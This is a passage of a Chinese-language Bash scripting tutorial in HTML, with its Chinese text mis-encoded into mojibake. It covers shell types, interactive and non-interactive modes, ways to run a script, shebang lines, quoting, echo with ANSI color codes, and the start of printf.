<li><code>é…ç½®æ–‡ä»¶</code>ï¼šæ§åˆ¶ Shell å¯åŠ¨æ—¶çš„åˆå§‹åŒ–è¡Œä¸ºï¼Œåˆ†ä¸ºâ€œç™»å½•/éç™»å½•â€å’Œâ€œäº¤äº’/éäº¤äº’â€åŠ è½½æ¨¡å¼</li>
<li><code>ç”¨æˆ·è‡ªå®šä¹‰</code>ï¼šåŒ…æ‹¬åˆ«åaliasã€å‡½æ•°å’Œå¿«æ·æ–¹å¼</li>
</ul>
<p>ç¼–å†™ Shell è„šæœ¬å¹¶ä¸éœ€è¦ç‰¹æ®Šçš„ IDEï¼Œä»»ä½•æ–‡æœ¬ç¼–è¾‘å™¨ï¼ˆVim/VSCodeï¼‰é…åˆä¸€ä¸ªè§£é‡Šå™¨å³å¯ã€‚è™½ç„¶ Linux ç³»ç»Ÿä¸­å­˜åœ¨å¤šç§ Shellï¼Œä½†ä¸»æµé˜µè¥ä¸»è¦åˆ†ä¸ºå››å¤§ç±»ï¼š</p>






























<table><thead><tr><th>Shell</th><th>å…¨ç§°</th><th>ç‰¹ç‚¹</th></tr></thead><tbody><tr><td>sh</td><td>Bourne Shell</td><td>Unix æ ‡å‡†é»˜è®¤ shellï¼Œ<strong>éµå¾ª POSIX æ ‡å‡†</strong>ï¼Œå…¼å®¹æ€§å¥½ï¼ŒåŸºç¡€å¹¿æ³›</td></tr><tr><td><code>bash</code></td><td>Bourne Again Shell</td><td>Linux æ ‡å‡†é»˜è®¤ shellï¼ŒåŠŸèƒ½ä¸°å¯Œï¼Œå…¼å®¹ shï¼Œæ”¯æŒè„šæœ¬ç¼–ç¨‹</td></tr><tr><td>fish</td><td>Friendly Interactive Shell</td><td>ç”¨æˆ·å‹å¥½ï¼Œæ™ºèƒ½è‡ªåŠ¨è¡¥å…¨ï¼Œè¯­æ³•é«˜äº®ï¼Œå¼€ç®±å³ç”¨</td></tr><tr><td>zsh</td><td>Z Shell</td><td>macOS çš„é»˜è®¤ Shellã€‚å®Œå…¨å…¼å®¹ Bashï¼Œä½†åœ¨è‡ªåŠ¨è¡¥å…¨ã€ä¸»é¢˜æ’ä»¶ï¼ˆå¦‚ Oh My Zshï¼‰æ–¹é¢æ‹¥æœ‰æè‡´ä½“éªŒï¼Œæ˜¯å¼€å‘è€…æ¡Œé¢çš„é¦–é€‰</td></tr></tbody></table>
<blockquote>
<p>åœ¨å¤§å¤šæ•°ç°ä»£ Linux ç³»ç»Ÿï¼ˆå¦‚CentOS/Ubuntuï¼‰ä¸­ï¼Œ<code>/bin/sh</code>å¾€å¾€åªæ˜¯ä¸€ä¸ªæŒ‡å‘<code>/bin/bash</code>çš„ç¬¦å·é“¾æ¥</p>
<p>å½“é€šè¿‡<code>sh script.sh</code>è¿è¡Œè„šæœ¬æ—¶ï¼ŒBash ä¼šä»¥<strong>POSIX å…¼å®¹æ¨¡å¼</strong>å¯åŠ¨ï¼Œæ­¤æ—¶å®ƒä¼šå…³é—­éƒ¨åˆ† Bash ç‰¹æœ‰çš„æ‰©å±•åŠŸèƒ½ï¼ˆå¦‚<code>[[...]]</code>æ¡ä»¶åˆ¤æ–­ï¼‰ï¼Œä»¥æ¨¡ä»¿è€å¼ Bourne Shell çš„è¡Œä¸ºã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆæœ‰æ—¶å€™åŒä¸€æ®µè„šæœ¬ç”¨ bash è·‘æ²¡é—®é¢˜ï¼Œç”¨ sh è·‘å´æŠ¥é”™çš„åŸå› </p>
</blockquote>
<h4 data-id="heading-4">Shellæ¨¡å¼</h4>
<p>Shell çš„è¿ä½œæ¨¡å¼ä»æ ¹æœ¬ä¸Šå–å†³äºå…¶<strong>å‘½ä»¤è¯»å–æ¥æº</strong>ã€‚æ ¹æ®äº¤äº’å½¢å¼çš„ä¸åŒï¼Œå¯ä»¥åˆ’åˆ†ä¸º<code>äº¤äº’æ¨¡å¼</code>å’Œ<code>éäº¤äº’æ¨¡å¼</code></p>
<h5 data-id="heading-5">äº¤äº’æ¨¡å¼</h5>
<p>ç”¨æˆ·ç™»å½•ç»ˆç«¯åçš„é»˜è®¤æ¨¡å¼ã€‚Shell ä½œä¸ºä¸€ä¸ª<strong>REPLï¼ˆRead-Eval-Print Loopï¼‰ç¯å¢ƒ</strong>è¿è¡Œ</p>
<ol>
<li><strong>Read</strong>ï¼šä»æ ‡å‡†è¾“å…¥ï¼ˆStdinï¼‰ç­‰å¾…ç”¨æˆ·é”®å…¥å‘½ä»¤</li>
<li><strong>Eval</strong>ï¼šè§£æå¹¶æ‰§è¡Œå‘½ä»¤</li>
<li><strong>Print</strong>ï¼šå°†ç»“æœè¾“å‡ºåˆ°ç»ˆç«¯ï¼ˆStdoutï¼‰</li>
<li><strong>Loop</strong>ï¼šå†æ¬¡æ˜¾ç¤ºæç¤ºç¬¦ï¼ˆPromptï¼‰ï¼Œç­‰å¾…ä¸‹ä¸€æ¡æŒ‡ä»¤</li>
</ol>
<p>å¯ä»¥å°†Shellçš„äº¤äº’æ¨¡å¼ç®€å•ç†è§£ä¸ºæ‰§è¡Œå‘½ä»¤è¡Œã€‚ä»¥ä¸‹å³ä¸ºå¤„äºäº¤äº’æ¨¡å¼ä¸‹</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å…¸å‹çš„äº¤äº’å¼æç¤ºç¬¦ï¼ˆPS1å˜é‡å®šä¹‰ï¼‰</span>
user@host:~$
<span class="hljs-comment"># æ­¤æ—¶å¯ç›´æ¥è¾“å…¥ ls, top, docker ps ç­‰å‘½ä»¤</span>
</code></pre>
<h5 data-id="heading-6">éäº¤äº’æ¨¡å¼</h5>
<p>Shell è„šæœ¬è¿è¡Œæ—¶çš„å…¸å‹æ¨¡å¼ï¼ˆæ‰¹å¤„ç†æ¨¡å¼ï¼‰ã€‚æ­¤æ¨¡å¼ä¸‹ï¼ŒShell <strong>ä¸ä¸ç”¨æˆ·è¿›è¡Œå®æ—¶äº¤äº’</strong>ï¼Œè€Œæ˜¯ä»æ–‡ä»¶æˆ–ç®¡é“ä¸­è¯»å–ä¸€ç³»åˆ—å‘½ä»¤</p>
<ul>
<li><code>ç”Ÿå‘½å‘¨æœŸ</code>ï¼šShell è¯»å–æ–‡ä»¶ -&gt; æŒ‰é¡ºåºæ‰§è¡Œå‘½ä»¤ -&gt; æ‰§è¡Œå®Œæ¯•å Shell è¿›ç¨‹è‡ªåŠ¨ç»ˆæ­¢ -&gt; æ§åˆ¶æƒè¿”å›çˆ¶è¿›ç¨‹</li>
</ul>
<p>ç¼–å†™å®Œè„šæœ¬æ–‡ä»¶ï¼ˆå¦‚ script.shï¼‰åï¼Œå¦‚ä½•è¿è¡Œå®ƒæ˜¯å¾ˆå¤šæ–°æ‰‹å®¹æ˜“æ··æ·†çš„åœ°æ–¹ã€‚æ‰§è¡Œæ–¹å¼ä¸ä»…å†³å®šäº†æƒé™éœ€æ±‚ï¼Œæ›´å†³å®šäº†ä»£ç è¿è¡Œçš„<strong>è¿›ç¨‹ä½œç”¨åŸŸ</strong></p>
<p><strong>æ–¹å¼ä¸€</strong>ï¼šè§£é‡Šå™¨å‚æ•°æ‰§è¡Œï¼ˆFork å­è¿›ç¨‹ï¼‰</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ç›´æ¥è°ƒç”¨ Shell ç¨‹åºï¼ˆå¦‚ bash æˆ– shï¼‰ï¼Œå°†è„šæœ¬è·¯å¾„ä½œä¸ºå‚æ•°ä¼ é€’</span>
bash script.sh
sh script.sh

<span class="hljs-comment"># å½“å‰ Shell å¯åŠ¨ä¸€ä¸ªæ–°çš„ å­ Shell è¿›ç¨‹æ¥è§£æè„šæœ¬</span>
<span class="hljs-comment"># è„šæœ¬æ–‡ä»¶æœ¬èº«ä¸éœ€è¦æ‰§è¡Œæƒé™ï¼ˆxï¼‰ï¼Œåªéœ€æœ‰è¯»å–æƒé™ï¼ˆrï¼‰</span>
</code></pre>
<p><strong>æ–¹å¼äºŒ</strong>ï¼šç›´æ¥è·¯å¾„æ‰§è¡Œï¼ˆFork å­è¿›ç¨‹ï¼‰</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å°†è„šæœ¬ä½œä¸ºå¯æ‰§è¡Œç¨‹åºç›´æ¥è¿è¡Œ</span>
<span class="hljs-built_in">chmod</span> +x script.sh  <span class="hljs-comment"># å¿…é¡»å…ˆèµ‹äºˆæ‰§è¡Œæƒé™</span>
./script.sh

<span class="hljs-comment"># Shell ä¾ç„¶ä¼š Fork ä¸€ä¸ªå­è¿›ç¨‹ã€‚è§£é‡Šå™¨ç”±è„šæœ¬ç¬¬ä¸€è¡Œçš„ Shebang å†³å®š</span>
<span class="hljs-comment"># å¿…é¡»æ‹¥æœ‰ r å’Œ x æƒé™</span>
</code></pre>
<p><strong>æ–¹å¼ä¸‰</strong>ï¼šSourcing æ‰§è¡Œï¼ˆå½“å‰è¿›ç¨‹ï¼‰</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># ä½¿ç”¨ source æˆ–å…¶åˆ«å . æ¥åŠ è½½è„šæœ¬</span>
<span class="hljs-built_in">source</span> script.sh
<span class="hljs-comment"># ç‚¹ä¸æ–‡ä»¶åä¹‹é—´æœ‰ç©ºæ ¼</span>
. script.sh

<span class="hljs-comment"># ä¸å¯åŠ¨å­è¿›ç¨‹ï¼Œç›´æ¥åœ¨å½“å‰ Shell ç¯å¢ƒä¸­é€è¡Œæ‰§è¡Œè„šæœ¬å†…å®¹</span>
<span class="hljs-comment"># è„šæœ¬å†…å®šä¹‰çš„å˜é‡ã€å‡½æ•°ä¼šç›´æ¥â€œæ±¡æŸ“â€å½“å‰ç»ˆç«¯ç¯å¢ƒï¼›è„šæœ¬å†…çš„ exit å‘½ä»¤ä¼šå¯¼è‡´å½“å‰ç»ˆç«¯çª—å£ç›´æ¥å…³é—­</span>
</code></pre>
<p>ä¸‰ç§æ–¹å¼æ€»ç»“å¦‚ä¸‹ï¼š</p>









































<table><thead><tr><th>æ–¹å¼</th><th>å…¸å‹æŒ‡ä»¤</th><th>è¿›ç¨‹å½’å±</th><th>å˜é‡ä½œç”¨åŸŸ</th><th>æƒé™ä¾èµ–</th><th>Shebang</th><th>æ ¸å¿ƒç”¨é€”</th></tr></thead><tbody><tr><td><strong>è§£é‡Šå™¨æ‰§è¡Œ</strong></td><td><code>bash file.sh</code></td><td><strong>å­è¿›ç¨‹</strong></td><td>éš”ç¦»ï¼ˆç»“æŸåé‡Šæ”¾ï¼‰</td><td>è¯»å–ï¼ˆReadï¼‰</td><td>è¢«å¿½ç•¥</td><td>ä¸´æ—¶è¿è¡Œã€è°ƒè¯•</td></tr><tr><td><strong>ç›´æ¥æ‰§è¡Œ</strong></td><td><code>./file.sh</code></td><td><strong>å­è¿›ç¨‹</strong></td><td>éš”ç¦»ï¼ˆç»“æŸåé‡Šæ”¾ï¼‰</td><td>è¯»+æ‰§è¡Œ ï¼ˆR+Xï¼‰</td><td><strong>ä¾èµ–</strong></td><td>æ ‡å‡†åŒ–è„šæœ¬</td></tr><tr><td><strong>å†…å»ºåŠ è½½</strong></td><td><code>source file.sh</code></td><td><strong>å½“å‰è¿›ç¨‹</strong></td><td><strong>ä¿ç•™</strong>ï¼ˆæ±¡æŸ“ç¯å¢ƒï¼‰</td><td>è¯»å–ï¼ˆReadï¼‰</td><td>æ— è§†</td><td>ç¯å¢ƒé…ç½®ã€åº“åŠ è½½</td></tr></tbody></table>
<h3 data-id="heading-7">åŸºæœ¬è¯­æ³•</h3>
<h4 data-id="heading-8">è§£é‡Šå™¨</h4>
<p>Shell è„šæœ¬çš„ç¬¬ä¸€è¡Œé€šå¸¸åŒ…å«ä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦åºåˆ—<code>#!</code>ï¼ŒæŠ€æœ¯æœ¯è¯­ç§°ä¸º<strong>Shebang</strong>ï¼ˆæˆ– Hashbangï¼‰ã€‚å®ƒä¸ä»…æ˜¯ä¸€è¡Œæ³¨é‡Šï¼Œæ›´æ˜¯å†™ç»™<strong>æ“ä½œç³»ç»Ÿå†…æ ¸</strong>çœ‹çš„â€œæŒ‡ä»¤â€ï¼Œå‘Šè¯‰ç³»ç»Ÿå…¶åè·¯å¾„æ‰€æŒ‡å®šçš„ç¨‹åºå³æ˜¯è§£é‡Šæ­¤è„šæœ¬æ–‡ä»¶çš„ Shell è§£é‡Šå™¨</p>
<p>åœ¨ Shell ä¸­ï¼Œä½ ä¼šè§åˆ°è¯¸å¦‚ä»¥ä¸‹çš„æ³¨é‡Šï¼š</p>
<ul>
<li>ç¡¬ç¼–ç è·¯å¾„</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/sh</span>
<span class="hljs-comment">#!/bin/bash</span>
<span class="hljs-comment">#!/usr/bin/python</span>
</code></pre>
<p>ç›´æ¥æŒ‡å®šè§£é‡Šå™¨çš„ç»å¯¹è·¯å¾„ï¼Œä½†ç§»æ¤æ€§å·®ï¼Œä¸€æ—¦è·¯å¾„ä¸åŒ¹é…ï¼Œè„šæœ¬ç›´æ¥æŠ¥é”™<code>File not found</code></p>
<ul>
<li>åŠ¨æ€æŸ¥æ‰¾</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/usr/bin/env bash</span>
<span class="hljs-comment">#!/usr/bin/env python3</span>
</code></pre>
<p><code>env</code>ä¼šæ ¹æ®å½“å‰ç”¨æˆ·çš„ç¯å¢ƒå˜é‡<code>PATH</code>ï¼Œè‡ªåŠ¨æŸ¥æ‰¾ç¬¬ä¸€ä¸ªåŒ¹é…çš„ç¨‹åºï¼Œæ­¤ç§æ–¹å¼æœ€ä¸ºæ¨è</p>
<h4 data-id="heading-9">æ³¨é‡Š</h4>
<p>å„ç§è¯­è¨€éƒ½æœ‰å¯¹åº”çš„æ³¨é‡Šè¯­æ³•ï¼ŒShellè¯­æ³•ä¸­ï¼Œæ³¨é‡Šæ˜¯ç‰¹æ®Šçš„è¯­å¥ï¼Œä¼šè¢«Shellè§£é‡Šå™¨å¿½ç•¥</p>
<ul>
<li>å•è¡Œæ³¨é‡Šï¼šä»¥<code>#</code>å¼€å¤´ï¼Œåˆ°è¡Œå°¾ç»“æŸ</li>
<li>å¤šè¡Œæ³¨é‡Šï¼šä»¥<code>:&lt;&lt;EOF</code>å¼€å¤´ï¼Œåˆ°<code>EOF</code>ç»“æŸ</li>
</ul>
<pre><code class="hljs language-shell" lang="shell"><span class="hljs-meta prompt_"># </span><span class="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">'è¿™æ˜¯å•è¡Œæ³¨é‡Š'</span></span>

:&lt;&lt;EOF
echo 'è¿™æ˜¯å¤šè¡Œæ³¨é‡Š'
echo 'è¿™æ˜¯å¤šè¡Œæ³¨é‡Š'
echo 'è¿™æ˜¯å¤šè¡Œæ³¨é‡Š'
EOF
</code></pre>
<h4 data-id="heading-10">å¼•å·</h4>





















<table><thead><tr><th>å¼•å·</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>å•å¼•å·</td><td>æ‰€è§å³æ‰€å¾—ï¼Œå•å¼•å·é‡Œé¢å†…å®¹åŸå°ä¸åŠ¨è¾“å‡º</td></tr><tr><td>åŒå¼•å·</td><td>åŒå¼•å·å†…çš„å­—ç¬¦ä¸²ä¼šè¿›è¡Œ<strong>å˜é‡æ›¿æ¢</strong>å’Œ<strong>è½¬ä¹‰å¤„ç†</strong> ï¼Œä½†ä¸ä¼šæ‰§è¡Œå‘½ä»¤æ›¿æ¢ï¼Œä¸è§£æ{}å’Œé€šé…ç¬¦</td></tr><tr><td>åå¼•å·</td><td>ä¼˜å…ˆæ‰§è¡Œï¼Œå…ˆæ‰§è¡Œåå¼•å·é‡Œé¢çš„å‘½ä»¤ï¼Œä¼šè¿›è¡Œå‘½ä»¤æ›¿æ¢</td></tr></tbody></table>
<p>åœ¨åŒå¼•å·ä¸­ï¼Œå˜é‡å¼•ç”¨æˆ–è€…å‘½ä»¤ç½®æ¢æ˜¯ä¼šè¢«å±•å¼€çš„ã€‚åœ¨å•å¼•å·ä¸­ä¸ä¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">"Your home: <span class="hljs-variable">$HOME</span>"</span> <span class="hljs-comment"># Your home: /Users/&lt;username&gt;</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">'Your home: $HOME'</span> <span class="hljs-comment"># Your home: $HOME</span>
</code></pre>
<p>å½“å±€éƒ¨å˜é‡å’Œç¯å¢ƒå˜é‡åŒ…å«ç©ºæ ¼æ—¶ï¼Œå®ƒä»¬åœ¨å¼•å·ä¸­çš„æ‰©å±•è¦æ ¼å¤–æ³¨æ„</p>
<pre><code class="hljs language-bash" lang="bash">INPUT=<span class="hljs-string">"A string  with   strange    whitespace."</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$INPUT</span>   <span class="hljs-comment"># A string with strange whitespace.</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$INPUT</span>"</span> <span class="hljs-comment"># A string  with   strange    whitespace.</span>
</code></pre>
<h4 data-id="heading-11">echo</h4>
<h5 data-id="heading-12">åŸºæœ¬ä½¿ç”¨</h5>
<p><code>echo</code>ç”¨äºåœ¨shellä¸­æ‰“å°shellå˜é‡çš„å€¼ï¼Œæˆ–è€…ç›´æ¥è¾“å‡ºæŒ‡å®šçš„å­—ç¬¦ä¸²ï¼Œåœ¨shellç¼–ç¨‹ä¸­æä¸ºå¸¸ç”¨</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> [Option] [String]

-eï¼šå¯ç”¨è½¬ä¹‰å­—ç¬¦
-Eï¼šä¸å¯ç”¨è½¬ä¹‰å­—ç¬¦ï¼ˆé»˜è®¤ï¼‰
-nï¼šç»“å°¾ä¸æ¢è¡Œï¼Œé»˜è®¤æƒ…å†µä¸‹ <span class="hljs-built_in">echo</span> ä¼šåœ¨æœ«å°¾è¿½åŠ ä¸€ä¸ª \n
</code></pre>
<ul>
<li>ä¸ä½¿ç”¨è½¬ä¹‰å­—ç¬¦</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é»˜è®¤æƒ…å†µä¸‹ï¼Œechoè¾“å‡ºç»“æœè‡ªå¸¦æ¢è¡Œç¬¦\n</span>
name=world
<span class="hljs-built_in">echo</span> <span class="hljs-string">"hello, world"</span> <span class="hljs-comment"># hello, world</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"hello, \"world\""</span> <span class="hljs-comment"># hello, "world"</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"hello, \"<span class="hljs-variable">${name}</span>\""</span> <span class="hljs-comment"># hello, "world"</span>

<span class="hljs-comment"># è¾“å‡ºå«æ¢è¡Œç¬¦çš„å­—ç¬¦ä¸²</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"YES\nNO"</span> <span class="hljs-comment"># YES\nNO</span>

<span class="hljs-comment"># è¾“å‡ºé‡å®šå‘åˆ°æ–‡ä»¶</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"test"</span> &gt; test.txt

<span class="hljs-comment"># è¾“å‡ºæ‰§è¡Œç»“æœ</span>
<span class="hljs-built_in">echo</span> `<span class="hljs-built_in">pwd</span>` <span class="hljs-comment"># (å½“å‰ç›®å½•è·¯å¾„)</span>
</code></pre>
<ul>
<li>ä½¿ç”¨è½¬ä¹‰å­—ç¬¦</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"YES\nNO"</span> <span class="hljs-comment"># -e å¼€å¯è½¬ä¹‰</span>
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  YES</span>
<span class="hljs-comment">#  NO</span>

<span class="hljs-built_in">echo</span> -e <span class="hljs-string">"YES\c"</span> <span class="hljs-comment"># -e å¼€å¯è½¬ä¹‰ \c ä¸æ¢è¡Œ</span>
<span class="hljs-built_in">echo</span> <span class="hljs-string">"NO"</span>
<span class="hljs-comment">#  Output:</span>
<span class="hljs-comment">#  YESNO</span>
</code></pre>
<h5 data-id="heading-13">è¿›é˜¶ä½¿ç”¨</h5>
<p>æ§åˆ¶echoè¾“å‡ºæ–‡å­—çš„é¢œè‰²</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"æ§åˆ¶åºåˆ—1æ–‡æœ¬å†…å®¹æ§åˆ¶åºåˆ—2"</span>

<span class="hljs-comment"># æ§åˆ¶åºåˆ—ç»„æˆ</span>
\e[æ ·å¼ä»£ç 1;æ ·å¼ä»£ç 2;å‰æ™¯è‰²ä»£ç ;èƒŒæ™¯è‰²ä»£ç m
</code></pre>
<p>ä»¥<code>echo -e "\e[1;31mThis is red text\e[0m"</code>ä¸ºä¾‹</p>
<ul>
<li><code>\e</code>ï¼šç­‰åŒäº<code>\033</code>ï¼Œè¡¨ç¤º ANSI è½¬ä¹‰å­—ç¬¦çš„èµ·å§‹ï¼ˆEscape å­—ç¬¦ï¼‰</li>
<li><code>[</code>ï¼šç´§è·Ÿ<code>\e</code>åï¼Œè¡¨ç¤ºè¿›å…¥æ§åˆ¶åºåˆ—æ¨¡å¼</li>
<li><code>1;31m</code>ï¼š1ä¸ºæ ·å¼ä»£ç ï¼Œ31ä¸ºå‰æ™¯è‰²ä»£ç ï¼Œmè¡¨ç¤ºæ§åˆ¶åºåˆ—ç»“æŸ</li>
<li><code>\e[0m</code>ï¼š0è¡¨ç¤ºé‡ç½®æ‰€æœ‰å±æ€§ï¼Œmè¡¨ç¤ºç»“æŸæ§åˆ¶åºåˆ—</li>
</ul>
<p>ä»¥ä¸Šå‘½ä»¤ï¼Œç»ˆç«¯ä¼šè¾“å‡º<strong>åŠ ç²—çš„çº¢è‰²æ–‡æœ¬</strong> <code>This is red text</code>ï¼Œéšåé¢œè‰²å’Œæ ·å¼æ¢å¤é»˜è®¤</p>































































































































































































<table><thead><tr><th>ç±»å‹</th><th>ä»£ç </th><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>æ ·å¼ä»£ç </td><td>0</td><td>é‡ç½®æ‰€æœ‰å±æ€§ï¼ˆé¢œè‰²ã€åŠ ç²—ã€ä¸‹åˆ’çº¿ç­‰ï¼‰</td><td>\e[0m</td></tr><tr><td/><td>1</td><td>åŠ ç²—/é«˜äº®æ–‡æœ¬</td><td>\e[1;31mï¼ˆçº¢è‰²åŠ ç²—ï¼‰</td></tr><tr><td/><td>4</td><td>ä¸‹åˆ’çº¿æ–‡æœ¬</td><td>\e[4mUnderline\e[0m</td></tr><tr><td/><td>5</td><td>é—ªçƒæ–‡æœ¬ï¼ˆé—ªçƒé¢‘ç‡ç”±ç»ˆç«¯å†³å®šï¼‰</td><td>\e[5;31mFlashing Red\e[0m</td></tr><tr><td/><td>7</td><td>åè½¬é¢œè‰²ï¼ˆäº¤æ¢å‰æ™¯è‰²å’ŒèƒŒæ™¯è‰²ï¼‰</td><td>\e[7;30;47mInverted\e[0m</td></tr><tr><td/><td>8</td><td>éšè—æ–‡æœ¬ï¼ˆéƒ¨åˆ†ç»ˆç«¯æ”¯æŒï¼‰</td><td>\e[8mHidden Text\e[0m</td></tr><tr><td/><td>22</td><td>å–æ¶ˆåŠ ç²—ï¼ˆæ¢å¤é»˜è®¤ç²—ç»†ï¼‰</td><td>\e[22mNormal Text\e[0m</td></tr><tr><td/><td>24</td><td>å–æ¶ˆä¸‹åˆ’çº¿</td><td>\e[24mNo Underline\e[0m</td></tr><tr><td/><td/><td/><td/></tr><tr><td>å‰æ™¯è‰²ä»£ç </td><td>30</td><td>é»‘è‰²</td><td>\e[30mBlack Text\e[0m</td></tr><tr><td/><td>31</td><td>çº¢è‰²</td><td>\e[31mRed Text\e[0m</td></tr><tr><td/><td>32</td><td>ç»¿è‰²</td><td>\e[32mGreen Text\e[0m</td></tr><tr><td/><td>33</td><td>é»„è‰²</td><td>\e[33mYellow Text\e[0m</td></tr><tr><td/><td>34</td><td>è“è‰²</td><td>\e[34mBlue Text\e[0m</td></tr><tr><td/><td>35</td><td>ç´«è‰²</td><td>\e[35mMagenta Text\e[0m</td></tr><tr><td/><td>36</td><td>é’è‰²</td><td>\e[36mCyan Text\e[0m</td></tr><tr><td/><td>37</td><td>ç™½è‰²</td><td>\e[37mWhite Text\e[0m</td></tr><tr><td/><td/><td/><td/></tr><tr><td>èƒŒæ™¯è‰²ä»£ç </td><td>40</td><td>é»‘è‰²èƒŒæ™¯</td><td>\e[40;37mBlack BG\e[0m</td></tr><tr><td/><td>41</td><td>çº¢è‰²èƒŒæ™¯</td><td>\e[41;37mRed BG\e[0m</td></tr><tr><td/><td>42</td><td>ç»¿è‰²èƒŒæ™¯</td><td>\e[42;30mGreen BG\e[0m</td></tr><tr><td/><td>43</td><td>é»„è‰²èƒŒæ™¯</td><td>\e[43;30mYellow BG\e[0m</td></tr><tr><td/><td>44</td><td>è“è‰²èƒŒæ™¯</td><td>\e[44;37mBlue BG\e[0m</td></tr><tr><td/><td>45</td><td>ç´«è‰²èƒŒæ™¯</td><td>\e[45;37mMagenta BG\e[0m</td></tr><tr><td/><td>46</td><td>é’è‰²èƒŒæ™¯</td><td>\e[46;30mCyan BG\e[0m</td></tr><tr><td/><td>47</td><td>ç™½è‰²èƒŒæ™¯</td><td>\e[47;30mWhite BG\e[0m</td></tr><tr><td/><td/><td/><td/></tr><tr><td>æ‰©å±•åŠŸèƒ½</td><td>38;2;r;g;b</td><td>è‡ªå®šä¹‰å‰æ™¯è‰²ï¼ˆRGBï¼Œr/g/bä¸º0-255ï¼‰</td><td>\e[38;2;255;0;0mCustom Red\e[0m</td></tr><tr><td/><td>48;2;r;g;b</td><td>è‡ªå®šä¹‰èƒŒæ™¯è‰²ï¼ˆRGBï¼Œr/g/bä¸º0-255ï¼‰</td><td>\e[48;2;0;0;255;37mCustom Blue BG\e[0m</td></tr><tr><td/><td>5m</td><td>é—ªçƒï¼ˆä¸æ ·å¼ä»£ç  5 ç›¸åŒï¼‰</td><td>\e[31;5mFlashing Red\e[0m</td></tr></tbody></table>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[1;4;5;31;47mç´§æ€¥çŠ¶æ€\e[0m"</span> <span class="hljs-comment"># è¾“å‡ºé—ªçƒçš„ å¸¦æœ‰ä¸‹åˆ’çº¿çš„ ç™½è‰²èƒŒæ™¯çš„ çº¢è‰²æ–‡å­—</span>
</code></pre>
<h4 data-id="heading-14">printf</h4>
<p>printf æ˜¯ Shell ä¸­ç”¨äºæ ¼å¼åŒ–è¾“å‡ºçš„å‘½ä»¤ã€‚ä¸ echo ä¸åŒï¼Œprintf æ¥æºäº C è¯­è¨€æ ‡å‡†åº“ï¼Œéµå¾ª <strong>POSIX æ ‡å‡†</strong>ï¼Œå› æ­¤å®ƒå…·æœ‰æ›´å¥½çš„<strong>è·¨å¹³å°å…¼å®¹æ€§</strong>ï¼ˆä¸ä¼šå› ä¸º OS ä¸åŒè€Œå¯¼è‡´è¡Œä¸ºè¯¡å¼‚ï¼‰å’Œæ›´å¼ºå¤§çš„<strong>æ–‡æœ¬æ’ç‰ˆèƒ½åŠ›</strong></p>
<p>å…¶ç‰¹ç‚¹ä¸»è¦æœ‰ï¼š</p>
<ul>
<li><strong>ä¸è‡ªåŠ¨æ¢è¡Œ</strong>ï¼šprintf ä¸ä¼šåœ¨ç»“å°¾é»˜è®¤æ·»åŠ <code>\n</code>ï¼Œä½ éœ€è¦æ˜¾å¼åœ°åœ¨<code>FORMAT</code>å­—ç¬¦ä¸²ä¸­æ§åˆ¶æ¢è¡Œ</li>
<li><strong>æ ¼å¼ä¸å‚æ•°åˆ†ç¦»</strong>ï¼šå‰é¢æ˜¯â€œæ¨¡ç‰ˆâ€ï¼Œåé¢æ˜¯â€œæ•°æ®â€</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">printf</span> FORMAT [ARGUMENT]...
</code></pre>
<p>å¸¸è§æ ¼å¼æ›¿æ¢ç¬¦</p>



































<table><thead><tr><th>å ä½ç¬¦</th><th>å«ä¹‰</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr><td><strong>%s</strong></td><td><strong>å­—ç¬¦ä¸²</strong> (String)</td><td>æœ€å¸¸ç”¨</td></tr><tr><td><strong>%d</strong></td><td><strong>åè¿›åˆ¶æ•´æ•°</strong> (Decimal)</td><td>å¦‚æœå‚æ•°æ˜¯å°æ•°ä¼šè¢«æˆªæ–­ï¼Œæ˜¯éæ•°å­—å­—ç¬¦åˆ™æŠ¥é”™æˆ–æ˜¾ç¤ºä¸º0</td></tr><tr><td><strong>%f</strong></td><td><strong>æµ®ç‚¹æ•°</strong> (Float)</td><td>é»˜è®¤ä¿ç•™6ä½å°æ•°ï¼Œå¯é€šè¿‡ %.2f æ§åˆ¶ç²¾åº¦</td></tr><tr><td>%b</td><td>è½¬ä¹‰å­—ç¬¦ä¸²</td><td>ä¼šè§£æå‚æ•°ä¸­çš„è½¬ä¹‰åºåˆ—ï¼ˆå¦‚ \n, \tï¼‰</td></tr><tr><td>%x</td><td>åå…­è¿›åˆ¶æ•°</td><td>å¸¸ç”¨äºæ•°å€¼è½¬æ¢</td></tr></tbody></table>
<p>å¸¸è§è½¬ä¹‰å­—ç¬¦</p>



































